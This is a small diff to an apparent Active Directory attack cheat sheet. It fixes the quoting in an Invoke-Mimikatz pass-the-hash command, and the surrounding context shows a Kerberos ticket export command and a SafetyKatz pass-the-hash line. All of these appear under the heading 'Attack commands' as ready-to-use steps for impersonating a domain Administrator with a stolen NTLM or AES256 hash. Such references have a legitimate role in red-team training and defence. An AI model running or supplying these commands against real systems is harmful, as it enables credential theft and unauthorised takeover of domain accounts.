@@ -218,7 +218,7 @@ Invoke-Mimikatz -Command '"kerberos::list /export"'
 ### Attack commands
 
 <pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Needs Admin rights:
-Invoke-Mimikatz '"sekurlsa::pth /user:Administrator /domain:target.domain.local &#x3C; /ntlm:hash | /aes256:hash> /run:powershell.exe'"
+Invoke-Mimikatz '"sekurlsa::pth /user:Administrator /domain:target.domain.local &#x3C; /ntlm:hash | /aes256:hash> /run:powershell.exe"'
 
 Safetykatz.exe "sekurlsa::pth /user:administrator /domain:dom.local /aes256:hash /run:powershell.exe" "exit"
 
